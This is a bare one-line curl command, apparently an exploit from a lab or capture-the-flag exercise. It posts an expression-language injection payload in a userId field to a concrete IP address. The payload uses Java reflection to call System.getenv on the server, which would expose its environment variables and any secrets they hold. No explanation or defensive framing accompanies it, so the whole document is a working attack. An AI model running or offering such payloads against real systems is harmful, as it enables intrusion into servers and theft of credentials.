curl -X POST http://34.146.112.223:8080/profile \
  --data-urlencode "userId='+\${\"\".class.forName(\"org.apache.commons.lang3.reflect.MethodUtils\").invokeStaticMethod(\"\".class.forName(\"java.lang.System\"),\"getenv\") }+'"
